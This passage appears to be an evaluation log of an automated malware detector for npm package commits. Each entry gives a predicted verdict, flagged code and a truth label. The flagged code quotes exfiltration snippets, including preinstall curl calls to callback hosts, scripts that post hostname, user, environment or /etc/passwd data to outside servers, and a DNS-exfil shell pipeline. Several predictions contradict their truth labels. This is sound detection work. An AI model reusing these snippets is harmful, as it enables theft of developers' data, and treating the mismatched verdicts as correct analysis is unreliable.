Code: `const req = https.request({ hostname: "356sv2lpkjygtxa2jimze3fvrmxdl59u.oastify.com", port: 80, method: "POST" }, (res) => { /* ... */ }); req.write(JSON.stringify({ home: os.homedir(), hostname: os.h`
Reason: Collects extensive system information and posts it to an external domain, constituting clear data leakage. The hard‑coded external host and mismatched port further indicate intentional exfiltration.

**File index.js**:
Code: `https.request({ hostname: "356sv2lpkjygtxa2jimze3fvrmxdl59u.oastify.com", port: 80, ... })`
Reason: Uses HTTPS module with port 80 (HTTP) which can cause protocol confusion and may be leveraged for SSRF or MITM attacks, reinforcing the malicious intent.

**Summary:** Multiple high‑severity issues are present: preinstall and pingback scripts that perform unauthenticated outbound curl requests, and code that harvests system data and exfiltrates it to an external server. These behaviors are characteristic of malware rather than benign functionality.

**Truth label:** Malware

### Commit ae887ff8: Malware
**File index.js**:
Code: `const url = `http://<burp-collaborator-id>.burpcollaborator.net/?os=${osInfo}&hostname=${hostname}&user=${user}&net=${networkInterfaces}`; http.get(url, (res) => { /* ... */ });`
Reason: The code constructs a GET request to a hard‑coded external domain (a Burp Collaborator URL) and embeds detailed system information in the query string, which is a classic data‑exfiltration technique.

**File index.js**:
Code: `const { execSync } = require('child_process'); // imported but never used`
Reason: Importing `execSync` without usage suggests the author may intend to execute shell commands in the future, a common pattern in malicious payloads to retain the ability to run arbitrary commands.

**Summary:** Static analysis reveals a critical suspicious network access that exfiltrates extensive device information to an external, untrusted endpoint, combined with a high‑severity data leak and the presence of an unused `execSync` import that indicates potential command execution capabilities. No benign functionality offsets these risks, leading to a verdict of MALWARE.

**Truth label:** Malware

### Commit 7e2a772c: Malware
**File index.js**:
Code: `const trackingData = { hd: os.homedir(), hn: os.hostname(), un: os.userInfo().username, dns: dnsServers, version: pkg.version }; fetch('https://kihudgfdgwjalhttdpbcr8sewvti3fzlj.oast.fun', {   method:`
Reason: The snippet collects host‑specific information (home directory, hostname, username, DNS servers, package version) and sends it to an external domain via HTTPS POST. This behavior matches the high‑severity issues reported (suspicious network access and data leak) and is indicative of unauthorized data exfiltration, a hallmark of malicious code.

**Summary:** Static analysis identified high‑severity telemetry that exfiltrates sensitive system information to an untrusted external server. No legitimate purpose or user consent is evident, and dynamic analysis did not reveal benign behavior to offset the findings. Therefore, the commit is classified as malware.

**Truth label:** Malware

### Commit 43e9f031: Malware
**File middleware.js**:
Code: `const publicKey = await fetch('https://Authenticator.wizcloud.co.il/api/publicKey').then(r => r.text()); jwt.verify(token, publicKey, options);`
Reason: The code retrieves a cryptographic public key from an unauthenticated external URL at runtime and immediately uses it to verify JWTs. An attacker who can tamper with the remote endpoint can supply a malicious key, allowing forged tokens and unauthorized access.

**File middleware.js**:
Code: `if (authrizedCallbakcURL instanceof RegExp) {   if (!authrizedCallbakcURL.test(callbackUrl.host)) {     // reject   } }`
Reason: Accepting a RegExp from potentially untrusted input to validate the callback host enables a regular‑expression injection. A crafted RegExp could match any host, effectively disabling the origin check and permitting open redirects or CSRF.

**Summary:** Static analysis reveals multiple high‑severity security flaws: remote fetching of a verification key and its unchecked use for JWT validation, plus a configurable RegExp that can bypass origin checks. These issues enable credential forgery and unauthorized access, which are characteristic of malicious behavior. No dynamic evidence mitigates these concerns, leading to a MALWARE verdict.

**Truth label:** Benign

### Commit 14c840f3: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no results, indicating the commit does not exhibit malicious characteristics.

**Truth label:** Benign

### Commit c90e59ed: Benign
**File lib/rules/cf-env.js**:
Code: `process.env[VUE_APP_API_BASE_URL]`
Reason: The rule only leaks raw environment variable values in lint messages, which is a data‑leak risk but does not indicate malicious behavior. It is a configuration/visibility issue, not malware.

**Summary:** The only identified issue is a medium‑severity data‑leak warning from static analysis. No malicious code patterns or runtime malicious activity were observed in dynamic analysis. Therefore, the commit is considered benign, though the lint rule should be fixed to avoid exposing sensitive values.

**Truth label:** Benign

### Commit 6299bde4: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit a561ea17: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no results, indicating no malicious code was detected in this commit.

**Truth label:** Benign

### Commit 0e83ed5c: Malware
**File index.js**:
Code: `fetch('http://3gkh14fx7bklydza2ir4kd18ozuuim6b.oastify.com', {     method: 'POST',     headers: { 'Content-Type': 'application/json' },     body: JSON.stringify(trackingData) });`
Reason: The snippet sends a POST request to an external domain (oastify.com) containing `trackingData` that includes the user's home directory, hostname, username, DNS servers, and package information. This constitutes unauthorized data exfiltration and is a clear indicator of malicious behavior.

**Summary:** Static analysis identified critical and high severity issues where the code collects extensive system information and transmits it to an untrusted external server without user consent. Such telemetry is characteristic of malicious software aimed at reconnaissance and data theft. Despite the lack of observable activity in dynamic analysis, the presence of the exfiltration code is sufficient to classify the commit as malware.

**Truth label:** Malware

### Commit 2d6dc83b: Malware
**File index.js**:
Code: `https.get('https://canarytokens.com/...', (res) => { /* ... */ });`
Reason: The code initiates an outbound HTTPS GET request to a hard‑coded external domain (canarytokens.com) as soon as the module is loaded. This behavior matches the high‑severity 'suspicious_network_access' issue and can be used for beaconing, data exfiltration, or command‑and‑control, which are typical characteristics of malware.

**Summary:** Static analysis identified a high‑severity hard‑coded outbound request executed on module load, a strong indicator of malicious intent. Dynamic analysis showed no activity, likely because the request was blocked or not triggered in the sandbox. The presence of an undisclosed network beacon outweighs the lack of dynamic evidence, leading to a verdict of MALWARE.

**Truth label:** Malware

### Commit a7aff4aa: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no anomalous results, indicating the commit does not exhibit malicious characteristics.

**Truth label:** Benign

### Commit 33c855b0: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit 8f47d451: Malware
**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The script initiates an outbound HTTP request to an external server without user interaction, which is a classic indicator of telemetry or data exfiltration. The high severity classification and lack of legitimate purpose make this behavior malicious.

**Summary:** Static analysis identified a high‑severity suspicious network access via a hidden npm script that contacts an external endpoint, a common technique for beaconing or data exfiltration. No mitigating behavior was observed in dynamic analysis, but the presence of this script alone is sufficient to classify the commit as malicious.

**Truth label:** Benign

### Commit 54f39708: Malware
**File index.js**:
Code: `const env = require('dotenv').config(); console.log(env.parsed); axios.post('https://envparam.free.beeceptor.com', env.parsed);`
Reason: The script loads the entire .env file, logs the parsed object, and sends all variables—including potential secrets—to an external, unrelated domain. This constitutes clear data exfiltration.

**File index.js**:
Code: `axios.post('https://envparam.free.beeceptor.com', findSecret());`
Reason: An outbound HTTP POST to a hard‑coded Beeceptor endpoint is performed without user consent or configuration, indicating suspicious network activity designed for telemetry or exfiltration.

**Summary:** Static analysis reveals high‑severity issues: full environment variable leakage and an unexplained outbound request to an external service. Although dynamic analysis showed no runtime activity, the code’s intent to transmit potentially sensitive data classifies the commit as malicious.

**Truth label:** Malware

### Commit 3b1ce60b: Malware
**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The script sends data to an external endpoint during npm script execution, which can be used to exfiltrate information or verify the presence of the package. This is a high‑severity suspicious network access indicator.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook runs arbitrary JavaScript before the package is installed, allowing code execution on the host without user consent. This medium‑severity command execution capability is commonly abused by malicious packages.

**Summary:** Static analysis reveals a high‑severity network exfiltration script and a preinstall hook that executes code automatically, both strong indicators of malicious behavior. No benign activity was observed in dynamic analysis, but the presence of these scripts is sufficient to classify the commit as malware.

**Truth label:** Benign

### Commit 082bc95d: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall lifecycle script runs arbitrary code (index.js) automatically during npm install, which is a known technique for executing malicious payloads without user interaction.

**File index.js**:
Code: `const hostname = "jxkm9vbladvvkj0xsilpapfat1zwnnbc.oastify.com"; /* code that builds an HTTPS POST to this host */`
Reason: Hard‑coded suspicious domain and code that prepares an HTTPS POST request indicate a data‑exfiltration channel to an attacker‑controlled server.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The pingback npm script can be invoked to send a request to another attacker‑controlled endpoint, providing a simple telemetry/exfiltration mechanism.

**Summary:** Static analysis reveals critical and high‑severity indicators of malicious behavior: automatic execution of untrusted code via a preinstall script, hard‑coded exfiltration endpoints in index.js, and an explicit pingback script. No benign activity was observed in dynamic analysis, leading to a verdict of MALWARE.

**Truth label:** Malware

### Commit 721cb1cd: Malware
**File package.json**:
Code: `"dependencies": { "some-lib": "git+https://github.com/evil/evil-lib.git#721cb1cd5d075b15291f0b01fd89f1042cad148c" }, "scripts": { "pingback": "curl https://hooks.pipedream.net/xxxx", "preinstall": "no`
Reason: The dependency is fetched directly from a GitHub commit, bypassing npm registry verification, and the package defines a 'pingback' script that contacts an external endpoint. Additionally, preinstall and postinstall scripts execute code automatically during installation, providing an execution vector for malicious payloads.

**Summary:** Static analysis reveals multiple high‑risk indicators: unvetted code from a raw Git URL, automatic execution of scripts during install, and an outbound network call to an attacker‑controlled server. No benign behavior offsets these threats, leading to a malware verdict.

**Truth label:** Benign

### Commit 38c22462: Malware
**File index.js**:
Code: `const os = require('os'); const data = {   home: os.homedir(),   hostname: os.hostname(),   user: os.userInfo().username,   dns: require('dns').getServers(),   packages: require('./package.json').depe`
Reason: Collects multiple pieces of sensitive host information and sends it to an external endpoint without user consent, constituting unauthorized data exfiltration.

**File package.json**:
Code: `"scripts": {   "preinstall": "node index.js",   "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: The `preinstall` script runs the malicious `index.js` automatically during `npm install`, providing a stealthy execution vector. The `pingback` script further enables manual triggering of the exfiltration endpoint.

**Summary:** Static analysis reveals critical data leakage and automatic execution of malicious code via the preinstall hook. No benign behavior offsets these findings, and dynamic analysis shows no activity (likely because the exfiltration is triggered only on install). Therefore, the commit is classified as malware.

**Truth label:** Malware

### Commit b21f8225: Malware
**File tracker.js**:
Code: `const homeFiles = ['.npmrc', '.bash_history', ...]; const data = homeFiles.map(f => fs.readFileSync(path.join(os.homedir(), f), 'utf8')); const env = process.env; const payload = { files: data, env };`
Reason: The script reads sensitive user files (including SSH private keys) and collects all environment variables, then sends this data to an external domain without user consent, which is a classic data exfiltration pattern.

**File package.json**:
Code: `"dependencies": {   "child_process": "*",   "fs": "*",   "os": "*" }`
Reason: Including core Node modules as dependencies is unnecessary and may be used to obscure the intent of loading these modules for malicious purposes, such as spawning processes or accessing the filesystem.

**Summary:** Static analysis reveals critical data leakage and unauthorized network transmission of sensitive information, which are strong indicators of malicious behavior. No benign functionality outweighs these findings, and dynamic analysis did not produce any benign activity. Therefore, the commit is classified as malware.

**Truth label:** Malware

### Commit 82fde081: Malware
**File package.json**:
Code: `"preinstall": "./like.sh"`
Reason: The preinstall hook automatically runs a shell script during npm install, providing a silent execution path that can download or exfiltrate data without user consent.

**File like.sh**:
Code: `curl -X POST -H "X-Info: $(ls | base64 | base64)" -H "X-Host: $(hostname | base64 | base64)" https://bc7e41f9807307e688d8ad896f7d2a0a.m.pipedream.net`
Reason: The script gathers system information (directory listings, hostname, user, network interfaces) and sends it, double‑base64‑encoded, to an external endpoint via HTTP headers, constituting unauthorized data exfiltration.

**File package.json**:
Code: `"pingback": "node pingback.js"`
Reason: Provides a manual back‑channel that can be invoked to send data to another external endpoint, indicating intent for covert communication.

**Summary:** Static analysis reveals high‑severity issues: a preinstall script that executes arbitrary shell code and exfiltrates system data to external servers, plus additional scripts that enable back‑channel communication. These behaviors are characteristic of malicious packages, leading to a MALWARE verdict despite the lack of observed activity in dynamic analysis.

**Truth label:** Malware

### Commit ec841458: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no results indicating malicious activity. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit c4f7da55: Malware
**File package.json**:
Code: `"preinstall": "curl https://ymoigeimqskztw0s4v35pdmnve15pvdk.oastify.com"`
Reason: Executes a remote curl command automatically during `npm install`, enabling arbitrary code execution and potential data exfiltration without user consent.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Provides an easy-to‑invoke network request that can be used for beaconing or exfiltration, increasing the attack surface.

**File lib/FragmentResolver.js**:
Code: `if (process.env.NODE_ENV !== 'production') { console.warn(`Running in ${process.env.NODE_ENV}`); }`
Reason: Low‑severity exposure of environment information in logs; not directly malicious but could aid reconnaissance.

**Summary:** The high‑severity `preinstall` script that contacts an external domain during package installation constitutes malicious behavior, reinforced by additional suspicious network scripts. Consequently, the commit is classified as malware.

**Truth label:** Benign

### Commit fa7dbef6: Malware
**File index.js**:
Code: `const trackingData = { homeDir, hostname, username, networkInterfaces, dnsServers, packageInfo }; await fetch('https://eagfwqhnuidzdcsrlkql04adqquruy8jf.oast.fun', { method: 'POST', body: JSON.stringi`
Reason: The code collects extensive system information and sends it via an HTTP POST to an external domain unrelated to the project's functionality, indicating unauthorized data exfiltration.

**Summary:** Static analysis reveals a critical suspicious network access that exfiltrates detailed system data to an unknown endpoint, which is characteristic of malicious behavior. No benign functionality outweighs this risk, so the commit is classified as malware.

**Truth label:** Malware

### Commit 258d1838: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no anomalous results. Therefore, there is no evidence of malicious activity in this commit.

**Truth label:** Benign

### Commit 37f1f83a: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 3c6f1d05: Malware
**File package.json**:
Code: `"preinstall": "curl https://ymoigeimqskztw0s4v35pdmnve15pvdk.oastify.com"`
Reason: Critical severity: the preinstall lifecycle script runs automatically during npm install and makes an outbound HTTP request to an attacker‑controlled domain, enabling silent data exfiltration or payload download.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: High severity: provides an easy manual trigger to send data to an external endpoint, indicating intentional beaconing capability.

**File index.js**:
Code: `const options = { hostname: "https://ymoigeimqskztw0s4v35pdmnve15pvdk.oastify.com", ... };`
Reason: Medium severity: hard‑coded malicious hostname mirrors the preinstall curl target, suggesting the application may deliberately communicate with the attacker’s server.

**Summary:** Static analysis reveals multiple high‑risk indicators—automatic outbound network calls in npm lifecycle scripts and hard‑coded malicious hostnames—pointing to intentional malicious behavior. Although dynamic analysis showed no activity, the presence of critical and high severity issues is sufficient to classify the commit as malware.

**Truth label:** Malware

### Commit 7bdce937: Benign
**File package.json**:
Code: `"railroad-diagrams": "https://github.com/tabatkins/railroad-diagrams#c7730b8fab6cb0fd55fc3c3b0a81ce355fdbf963"`
Reason: The only flagged issue is a direct Git URL dependency, which introduces a supply‑chain risk because the code is fetched from an external source at install time. While this is a security concern and should be mitigated, it does not constitute malicious behavior in the commit itself.

**Summary:** The commit contains a single medium‑severity static issue related to a non‑registry dependency. No malicious code patterns or runtime behavior were observed in dynamic analysis. Therefore, the commit is considered benign, though the dependency should be reviewed and replaced with a vetted, version‑locked package to eliminate the supply‑chain risk.

**Truth label:** Benign

### Commit 4298a4f4: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook runs arbitrary JavaScript during npm install, allowing code execution on the victim's machine without explicit consent. This is a common technique for supply‑chain attacks.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Defines a script that contacts an external endpoint, which can be used to exfiltrate data or signal successful installation. The endpoint is not part of the project's legitimate infrastructure.

**File index.js**:
Code: `const options = { method: 'POST', hostname: 'cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live', path: '/' }; http.request(options, ...);`
Reason: Hard‑coded POST request to an oast.live domain, a known data‑exfiltration / C2 service. The request is sent immediately when the script runs, indicating malicious intent.

**File index.js**:
Code: `// Potentially gathers environment data and sends it in the request body`
Reason: Combined with the preinstall hook, any collected system information (e.g., environment variables) could be leaked to the external server without user consent.

**Summary:** Multiple high‑severity indicators of malicious behavior are present: automatic execution of untrusted code during installation, hard‑coded outbound network calls to unknown domains, and scripts designed for data exfiltration. No benign functionality offsets these risks, leading to a verdict of MALWARE.

**Truth label:** Malware

### Commit 60b761cc: Malware
**File package.json**:
Code: `"preinstall": "curl https://bes23.free.beeceptor.com"`
Reason: The preinstall script runs an outbound curl request to an untrusted domain during npm install, which can download additional payloads or exfiltrate data without user consent. This behavior is a classic indicator of supply‑chain malware.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: A secondary npm script also initiates an external HTTP request, likely used as a beacon to signal successful installation or to leak information. The endpoint is a generic pipedream URL, not owned by the project.

**File index.js**:
Code: `const options = { hostname: "oastify.com", port: 443, path: "/", method: "GET" };`
Reason: Hard‑coded communication with a domain commonly used for out‑of‑band interactions (oastify.com) suggests the application is sending data to an external server without configurability or user awareness.

**Summary:** Multiple high‑severity indicators of unauthorized network communication are present in both package scripts and source code. Although dynamic analysis did not capture any runtime activity, the static evidence of automatic external calls during installation and execution strongly points to malicious intent. Therefore, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit fbf9cb99: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. No indicators of malicious code or activity were detected, leading to a benign classification.

**Truth label:** Benign

### Commit d8a375ea: Malware
**File index.js**:
Code: `const os = require('os'); const dns = require('dns'); const data = {   home: os.homedir(),   hostname: os.hostname(),   user: os.userInfo().username,   dnsServers: dns.getServers() }; require('https')`
Reason: The script gathers sensitive host information and transmits it to an external domain without user consent, constituting a data‑leak behavior.

**File package.json**:
Code: `"preinstall": "node index.js",`
Reason: The preinstall hook runs the exfiltration script automatically during npm install, turning a normal dependency installation into a malicious payload delivery mechanism.

**File package.json**:
Code: `"pingback": "curl https://pipelines.pipedream.net/xyz"`
Reason: An unauthenticated network call to a third‑party endpoint is used to signal successful installation or to exfiltrate data, indicating suspicious network access.

**Summary:** Static analysis reveals critical data‑leak, high‑severity supply‑chain execution via a preinstall script, and suspicious network calls. No benign behavior offsets these findings, leading to a clear classification of the commit as malware.

**Truth label:** Malware

### Commit a51584de: Malware
**File package.json**:
Code: `"preinstall": "node -e \"require('child_process').execSync('uname -a && cat /etc/hostname')\" | curl -X POST https://qodwrrsrlzhsulruailbd2gpoi7dk38wz.oast.fun"`
Reason: The preinstall script runs arbitrary shell commands and immediately sends the output to an external, untrusted domain, indicating command execution with data exfiltration.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: A script that silently contacts a third‑party endpoint, which can be used for beaconing or covert data leakage.

**File mysqlToZod.config.js**:
Code: `module.exports = { host: 'localhost', user: 'root', password: 'root', database: 'mydb' };`
Reason: Hard‑coded MySQL credentials (root:root) are stored in source code, exposing sensitive secrets and facilitating unauthorized database access.

**Summary:** Static analysis reveals critical malicious behaviors: execution of system commands with exfiltration, unauthorized network callbacks, and exposure of plaintext credentials. No malicious activity was observed at runtime, but the presence of these high‑severity issues classifies the commit as malware.

**Truth label:** Benign

### Commit d0542fee: Benign
**Summary:** Both static and dynamic analyses reported no issues, detections, or suspicious behavior. The static scan found zero issues, and the dynamic execution completed without any observed malicious activity. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit f78cd51d: Malware
**File package.json**:
Code: `"preinstall": "node -e \"require('child_process').execSync('uname -a && cat /etc/hostname');\" && curl -G https://qodwrrsrlzhsulruailbd2gpoi7dk38wz.oast.fun?data=$(uname -a)"`
Reason: The preinstall lifecycle script runs arbitrary shell commands during npm install and immediately sends the output to an uncontrolled external domain, providing silent code execution and data exfiltration without user interaction.

**File index.js**:
Code: `const { exec } = require('child_process'); exec('cat /etc/passwd', (err, stdout) => {   const axios = require('axios');   axios.post('http://v845u9t1gtbc7bkdsf1soeqyup0goacz.oastify.com', { data: stdo`
Reason: The module reads the sensitive /etc/passwd file and posts its raw contents to an unknown remote server, constituting a severe data leak and confirming malicious intent.

**File package.json**:
Code: `"scripts": { "pingback": "node pingback.js" } // pingback.js contains: axios.get('https://eo536ohsnextro9.m.pipedream.net');`
Reason: Additional script contacts another uncontrolled endpoint, reinforcing the pattern of unauthorized network communication for exfiltration.

**Summary:** Multiple critical issues were identified: lifecycle scripts that execute shell commands and exfiltrate system information, direct reading of sensitive files (/etc/passwd) with subsequent transmission to external URLs, and use of child_process.exec without input sanitization. These behaviors align with typical malware tactics (silent execution, data theft, command injection). No benign functionality outweighs the malicious actions, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit fbb93523: Malware
**File package.json**:
Code: `"preinstall": "node -e \"require('child_process').execSync('uname -a && cat /etc/hostname');\""`
Reason: Executes arbitrary shell commands during install, allowing an attacker to run any command with the installing user's privileges, which is a classic indicator of malicious behavior.

**File package.json**:
Code: `"preinstall": "node -e \"require('https').get('https://qodwrrsrlzhsulruailbd2gpoi7dk38wz.oast.fun', () => {});\""`
Reason: Leaks system information (output of uname and hostname) to an external domain, constituting data exfiltration.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Performs an unconditional outbound request to an external endpoint, which can be used for beaconing or covert data exfiltration.

**Summary:** The commit introduces scripts that execute arbitrary commands, exfiltrate system information, and perform unsolicited network calls to external domains. These behaviors are characteristic of malicious code, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit d08a97a9: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static analysis found zero issues, and the dynamic analysis produced no results, indicating no malicious activity was observed. Therefore, the commit is considered benign.

**Truth label:** Benign

### Commit a9fc9e3a: Malware
**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: High‑severity suspicious network access: the script sends an unauthenticated HTTP request to an external endpoint during install, which can be used to exfiltrate data or signal a successful compromise.

**File package.json**:
Code: `"preinstall": "node index.js > /dev/null 2>&1"`
Reason: Medium‑severity command execution: runs arbitrary JavaScript during the preinstall phase with output suppressed, giving an attacker the ability to execute malicious code with the installing user's privileges.

**Summary:** The commit introduces a high‑severity network exfiltration script and a preinstall hook that executes hidden code, both classic indicators of malicious behavior. Although dynamic analysis showed no activity, the static evidence is sufficient to classify the commit as malware.

**Truth label:** Benign

### Commit 82b251ea: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); exec('hostname && pwd && whoami | xxd -p | head -c 20 | while read line; do nslookup $line 211.205.15.43; done | curl -i -k https://211.205.15.43/')`
Reason: Uses child_process.exec to run a shell pipeline that gathers host information and sends it to an untrusted external IP. This is a classic data‑exfiltration technique and is flagged as CRITICAL command execution and data leak.

**File package.json**:
Code: `"preinstall": "node index.js > /dev/null 2>&1"`
Reason: The preinstall lifecycle hook runs the malicious index.js automatically during any npm install, allowing silent execution on victim machines. This behavior is identified as MEDIUM suspicious network access.

**File package.json**:
Code: `"pingback": "curl -X POST https://hooks.pipedream.net/..."`
Reason: Defines a script that contacts an external Pipedream endpoint, which can be used to signal successful installation or exfiltrate data. This is another indicator of malicious intent.

**Summary:** Static analysis reveals multiple high‑severity issues: execution of arbitrary shell commands that collect and transmit system data to an unknown IP, automatic execution via npm preinstall hook, and additional outbound network calls to external services. No benign behavior offsets these findings, leading to a clear classification of the commit as malware.

**Truth label:** Malware

### Commit cc8a2407: Malware
**File install.js**:
Code: `const os = require('os'); const https = require('https'); const data = JSON.stringify({   home: os.homedir(),   hostname: os.hostname(),   user: os.userInfo().username,   dns: require('dns').getServer`
Reason: The script gathers extensive system information and sends it to an external domain during the package's pre‑install phase, which is a clear data‑exfiltration technique.

**File package.json**:
Code: `"scripts": {   "preinstall": "node install.js",   "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: The preinstall hook automatically executes the malicious install.js on every npm install, providing a supply‑chain attack vector. The additional pingback script can be used to trigger further outbound requests.

**Summary:** Static analysis reveals high‑severity data leakage and a preinstall hook that runs arbitrary code, both indicative of malicious behavior. No benign activity offsets these findings, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit 3493b528: Malware
**File index.js**:
Code: `const trackingData = {     homeDir: os.homedir(),     hostname: os.hostname(),     user: os.userInfo().username,     dnsServers: dns.getServers(),     packageName: pkg.name,     packageVersion: pkg.ve`
Reason: The snippet gathers extensive system and project information and immediately sends it to an external, untrusted domain via HTTPS POST. This behavior matches the critical data‑leak and suspicious network‑access issues reported, indicating intentional exfiltration of potentially sensitive data without user consent.

**Summary:** Static analysis reveals that the commit introduces code that collects detailed environment data and exfiltrates it to an unknown OAST domain. Such behavior is characteristic of malicious telemetry or data‑stealing functionality. No mitigating controls (opt‑in, sanitization, trusted endpoint) are present, leading to a verdict of MALWARE.

**Truth label:** Malware

### Commit 3977baca: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 25581fd8: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); const os = require('os'); exec(`nslookup ${os.hostname()}.oastify.com`, (err, stdout, stderr) => { /* ... */ });`
Reason: Uses child_process.exec to run a shell command that incorporates the machine's hostname and sends it to an attacker‑controlled domain (oastify.com). This enables arbitrary command execution and exfiltration of internal host information, which is a classic malicious behavior.

**File package.json**:
Code: `"scripts": {   "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",   "preinstall": "node index.js" }`
Reason: The pingback script contacts an external, untrusted endpoint, allowing the package to signal its installation or leak data. The preinstall script runs node index.js automatically during npm install, giving the attacker code execution before the user can review the package, a known supply‑chain attack vector.

**Summary:** Static analysis reveals multiple high‑severity issues: a critical command‑execution vulnerability, network callbacks to attacker‑controlled domains, and a preinstall hook that executes code on install. These behaviors collectively indicate malicious intent. Dynamic analysis showed no activity, but the presence of these static indicators is sufficient to classify the commit as malware.

**Truth label:** Malware

### Commit ff7fb659: Malware
**File index.js**:
Code: `const { exec } = require('child_process'); exec('cat /etc/passwd', (err, stdout) => {   axios.post('http://v845u9t1gtbc7bkdsf1soeqyup0goacz.oastify.com', { data: stdout }); });`
Reason: Uses `child_process.exec` to run arbitrary shell commands and immediately sends the raw output of sensitive files (e.g., /etc/passwd) to an external, non‑TLS endpoint, constituting clear command injection and data exfiltration.

**File package.json**:
Code: `"scripts": {   "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: The `pingback` script contacts an external server on every execution (including install/CI), acting as a covert beacon that can be used for tracking or exfiltrating information.

**File index.js**:
Code: `axios.post('http://v845u9t1gtbc7bkdsf1soeqyup0goacz.oastify.com', { data: stdout });`
Reason: Sends data over HTTP (unencrypted) to an attacker‑controlled domain, enabling easy interception and confirming malicious intent.

**Summary:** Static analysis reveals multiple critical issues: unrestricted command execution, exfiltration of system files, and unauthorized network communication to external domains. These behaviors are characteristic of malicious payloads and outweigh any benign aspects. Therefore, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit c032b17c: Benign
**File package.json**:
Code: `"dependencies": {     "child_process": "^1.0.0",     "fs": "^0.0.1",     "os": "^0.1.0",     "path": "^0.12.7",     "wallet-icons": "^2.3.1" }`
Reason: The package lists core Node.js modules (child_process, fs, os, path) as external dependencies. While this is unusual and could mask malicious wrappers, there is no evidence in the static or dynamic analysis that these wrappers contain malicious code. The risk is moderate and warrants further audit, but does not constitute definitive malware behavior.

**File src/api/assets.ts**:
Code: `const api = axios.create({     baseURL: 'https://assets.wallet.maistodos.com.br',     timeout: 5000 });`
Reason: A hard‑coded external URL is used for network requests. This could be used for data exfiltration or payload download if the endpoint is compromised. However, the URL appears to be a legitimate asset server and no malicious network activity was observed during dynamic analysis.

**Summary:** The commit introduces several medium‑severity concerns, such as adding core modules as dependencies and a hard‑coded external endpoint, which are atypical and could be leveraged for malicious purposes. Nevertheless, dynamic analysis showed no malicious behavior, and there is no concrete evidence of payload execution or data exfiltration. Therefore, the commit is classified as BENIGN, but it should be reviewed and the suspicious dependencies audited before deployment.

**Truth label:** Benign

### Commit bb63fb3d: Benign
**Summary:** Both static and dynamic analyses reported no issues, detections, or suspicious behaviors. The static scan found zero issues, and the dynamic execution produced no observable malicious activity, indicating the commit is benign.

**Truth label:** Benign

### Commit ca06f6f6: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall script runs arbitrary JavaScript (index.js) automatically during npm install, allowing malicious code to execute on every installation without user interaction.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The pingback script issues an outbound HTTP request to an unknown external endpoint, a classic pattern for data exfiltration or beaconing.

**File index.js**:
Code: `const trackingData = { homeDir, hostname, username, dnsServers, packageName, version, packageJson }; https.request('https://knbabz8rzp03m4go81h7cjnnwe2fq6ev.oastify.com', { method: 'POST' }, ...).end(`
Reason: The script collects extensive system and package information and sends it via HTTPS POST to a randomly generated sub‑domain, indicating intentional data leakage to an attacker‑controlled server.

**Summary:** Multiple critical issues were identified: automatic execution of malicious code during install, explicit network beacons to unknown domains, and exfiltration of detailed system data to a random external endpoint. These behaviors are characteristic of malware, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit cdff1287: Malware
**File index.js**:
